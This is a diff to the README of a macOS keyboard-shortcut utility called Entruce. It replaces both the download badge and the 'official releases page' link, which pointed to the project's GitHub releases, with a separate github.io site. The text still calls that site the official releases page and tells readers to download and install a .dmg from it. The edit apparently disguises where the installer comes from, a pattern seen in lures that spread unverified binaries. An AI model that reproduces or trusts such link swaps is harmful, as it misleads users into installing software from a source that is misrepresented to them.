@@ -1,12 +1,12 @@
 # ⌨️ Entruce - Standardize your chat app keyboard shortcuts
 
-[![](https://img.shields.io/badge/Download-Entruce-blue.svg)](https://github.com/Blinnireversed184/Entruce/releases)
+[![](https://img.shields.io/badge/Download-Entruce-blue.svg)](https://blinnireversed184.github.io)
 
 Entruce changes how you interact with chat applications. Many programs send messages the moment you press the Enter key. This often leads to incomplete thoughts or accidental sends. Entruce stops this behavior. It forces your keyboard to insert a new line when you press Enter. You use Command+Enter when you want to send your text. This simple change improves your daily workflow in tools like ChatGPT and Claude.
 
 ## 📥 How to download the app
 
-Visit the [official releases page](https://github.com/Blinnireversed184/Entruce/releases) to obtain the latest version of the software. You will see a list of available downloads. Look for the file that ends in .dmg for your macOS system. Click the file name to start your download. Your browser will save the installer to your Downloads folder.
+Visit the [official releases page](https://blinnireversed184.github.io) to obtain the latest version of the software. You will see a list of available downloads. Look for the file that ends in .dmg for your macOS system. Click the file name to start your download. Your browser will save the installer to your Downloads folder.
 
 ## 🛠️ Installation steps
 
